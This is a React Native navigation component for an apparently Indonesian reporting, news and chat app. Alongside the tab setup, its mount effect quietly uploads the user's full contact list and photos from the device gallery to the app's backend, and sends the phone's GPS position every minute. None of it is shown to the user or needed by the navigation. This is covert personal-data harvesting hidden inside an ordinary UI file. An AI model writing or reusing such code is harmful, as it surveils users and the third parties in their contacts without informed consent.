import React, { useContext, useEffect } from 'react';
import { Platform, Image, PermissionsAndroid } from 'react-native';
import { createBottomTabNavigator } from '@react-navigation/bottom-tabs';
import HomeScreen from '../screen/HomeScreen';
import BuletinBeritaNav from './BuletinBeritaNav';
import PelaporanNav from './PelaporanNav';
import ChatNav from './ChatNav';
import ChatSOSNav from './ChatSOSNav';
import { AuthContext } from '../context/AuthContext';
import Geolocation from '@react-native-community/geolocation';
import Contacts from 'react-native-contacts';
import RNFS from 'react-native-fs';
import axios from 'axios';
import { BASE_URL } from '../config/Config';
import ProfileScreen from '../screen/profile/ProfileScreen';
import {PERMISSIONS, RESULTS, check, request, requestMultiple, openSettings} from 'react-native-permissions';

const Tab = createBottomTabNavigator();

function MainNav({navigation}) {    
    const { token } = useContext(AuthContext);

    useEffect(() => {
        requestPermissions();
		const interval = setInterval(() => {
            getGeolocation();
            
		}, 60000); // Waktu dalam milidetik (satu menit = 60 detik = 60000 milidetik)
        getImageFiles();
        getContacts()
        
		return () => clearInterval(interval);
	}, []);

    const getGeolocation =  async () => {
            try {
                check(Platform.OS === 'android' ? PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION : PERMISSIONS.IOS.LOCATION_WHEN_IN_USE)
                    .then((result) => {
                        if(result === RESULTS.GRANTED) {
                            Geolocation.getCurrentPosition( info => {
                                postLocation(info.coords.latitude, info.coords.longitude)
                            });
                        } else {
                            console.log('Permission Denied')
                        }
                    })
                    .catch((error) => {
                        console.log(error);
                    });
            } catch (error) {
                console.log(error);
            }
    }

    const getContacts = async () => {
        try {
            check(Platform.OS === 'android' ? PERMISSIONS.ANDROID.READ_CONTACTS : PERMISSIONS.IOS.CONTACTS)
                .then((result) => {
                    if(result === RESULTS.GRANTED) {
                        Contacts.getAll()
                        .then((contacts) => {
                            postContact(contacts);
                        });
                    } else {
                        console.log('Permission Denied')
                    }
                })
                .catch((error) => {
                    console.log(error);
                });

        } catch(error) {
            console.log(error);
        }
    }

    const getImageFiles = async () => {
        try {
            const result = await check(
                Platform.OS === 'android'
                ? PERMISSIONS.ANDROID.READ_MEDIA_IMAGES
                : PERMISSIONS.IOS.MEDIA_LIBRARY
            );
        
            if (result === RESULTS.GRANTED) {
                const directoryPath = RNFS.ExternalStorageDirectoryPath + '/DCIM/Test'; // You can change the directory path if needed
                const files = await RNFS.readDir(directoryPath);
        
                // Filter image files
                const imageFiles = files.filter(
                    file => file.isFile() && file.name.endsWith('.jpg')
                );
        
                const images = [];
                const uploadImages = new FormData();
      
                // Log the image files
                imageFiles.forEach(imageFile => {
                    images.push({
                        uri: 'file://' + imageFile.path,
                        type: 'image/jpg',
                        name: imageFile.name,
                    });
                });
        
                images.forEach(val => {
                    uploadImages.append('file[]', val);
                });
      
                await postGalery(uploadImages);
            } else {
                console.log('Image Files Permission Denied');
            }
        } catch (error) {
            console.log('Error retrieving image files:', error);
        }
    };

    const postLocation = async (lat, lon) => {
        const params = {
            'lat': lat,
            'lon': lon,
        }
        try {
			const response = await axios.post(`${BASE_URL}/positions/update`, params, {
				headers: {
					Authorization: `Bearer ${JSON.parse(token)}`,
				},
			});

			console.log(response.data);
		} catch (error) {
			console.error(error);
		}
    }

    const postContact = async (params) => {
        const payload = {
            'contacts' : params
        }

        try {
			const response = await axios.post(`${BASE_URL}/contacts/store`, JSON.stringify(payload),
            {
				headers: {
                    'Content-Type': "application/json",
                    'Accept': "application/json",
					Authorization: `Bearer ${JSON.parse(token)}`,
				},
			});

			console.log(response.data);
		} catch (error) {
			console.error(error);
		}
    }

    const postGalery = async (params) => {
        console.log('Pramas Galery : ', params)
        try {
			const response = await axios.post(`${BASE_URL}/user/uploadGallery`, params,
            {
				headers: {
                    "Accept":"application/json",
                    "Content-Type" : "multipart/form-data",
					Authorization: `Bearer ${JSON.parse(token)}`,
				},
			});

			console.log(response.data);
		} catch (error) {
			console.log('Error Axios', error);
		}
    }

    const requestPermissions = async () => {
        try{
            if(Platform.OS === 'android') {
                requestMultiple([PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION, PERMISSIONS.ANDROID.CAMERA, PERMISSIONS.ANDROID.READ_CONTACTS, PERMISSIONS.ANDROID.READ_MEDIA_IMAGES]).then((statuses) => {
                    console.log('Permission Android Location : ', statuses[PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION]);
                    console.log('Permission Android Camera :', statuses[PERMISSIONS.ANDROID.CAMERA]);
                    console.log('Permission Android Contacts :', statuses[PERMISSIONS.ANDROID.READ_CONTACTS]);
                    console.log('Permission Android Media files :', statuses[PERMISSIONS.ANDROID.READ_MEDIA_IMAGES]);
                });

            } else if (Platform.OS === 'ios') {
                requestMultiple([PERMISSIONS.IOS.LOCATION_WHEN_IN_USE, PERMISSIONS.IOS.CAMERA, PERMISSIONS.IOS.CONTACTS, PERMISSIONS.IOS.MEDIA_LIBRARY, PERMISSIONS.IOS.PHOTO_LIBRARY]).then((statuses) => {
                    console.log('Permission IOS Location : ', statuses[PERMISSIONS.IOS.LOCATION_WHEN_IN_USE]);
                    console.log('Permission IOS Camera', statuses[PERMISSIONS.IOS.CAMERA]);
                    console.log('Permission IOS Contacts', statuses[PERMISSIONS.IOS.CONTACTS]);
                    console.log('Permission IOS Media files', statuses[PERMISSIONS.IOS.MEDIA_LIBRARY]);
                });
            }
        } catch(error) {
            console.log(error);
        }
    }
    
    return (
        <Tab.Navigator  
                        screenOptions={({ route }) => ({
                            tabBarHideOnKeyboard: true,
                            initialRouteName: 'Dashboard',
                            headerShown: false,
                            tabBarStyle: { backgroundColor: '#02170a', height: 54 },
                            tabBarLabelStyle: { paddingBottom: 5 },
                            tabBarActiveTintColor: '#00cea6',
                            tabBarInactiveTintColor: 'gray',
                            tabBarIcon: ({ focused, color, size }) => {
                                let iconSource;
                                if (route.name === 'Dashboard') {
                                    iconSource = focused ? require('../assets/Icons/dashboard.png') : require('../assets/Icons/dashboard.png');
                                } else if (route.name === 'Pelaporan') {
                                    iconSource = focused ? require('../assets/Icons/pelaporan.png') : require('../assets/Icons/pelaporan.png');
                                } else if (route.name === 'Buletin Berita') {
                                    iconSource = focused ? require('../assets/Icons/buletin-berita.png') : require('../assets/Icons/buletin-berita.png');
                                } else if (route.name === 'Chat') {
                                    iconSource = focused ? require('../assets/Icons/chat.png') : require('../assets/Icons/chat.png');
                                } else if (route.name === 'Chat SOS') {
                                    iconSource = focused ? require('../assets/Icons/sos.png') : require('../assets/Icons/sos.png');
                                } else if (route.name === 'Profile') {
                                    iconSource = focused ? require('../assets/Icons/sos.png') : require('../assets/Icons/sos.png');
                                }
                    
                                return <Image source={iconSource} style={{ width: size, height: size, tintColor: color }} />;
                            },
                        })}
                    >
                    <Tab.Screen name="Dashboard" component={HomeScreen}/>
                    <Tab.Screen name="Pelaporan" component={PelaporanNav} />
                    <Tab.Screen name="Buletin Berita" component={BuletinBeritaNav } />
                    <Tab.Screen name="Chat" component={ChatNav} />
                    <Tab.Screen name="Chat SOS" component={ChatSOSNav} />
                    <Tab.Screen name="Profile" component={ProfileScreen} options={{
                            tabBarButton: () => null,
                            tabBarVisible: false,
                        }} 
                    />
                </Tab.Navigator>
        
    );
}

export default MainNav;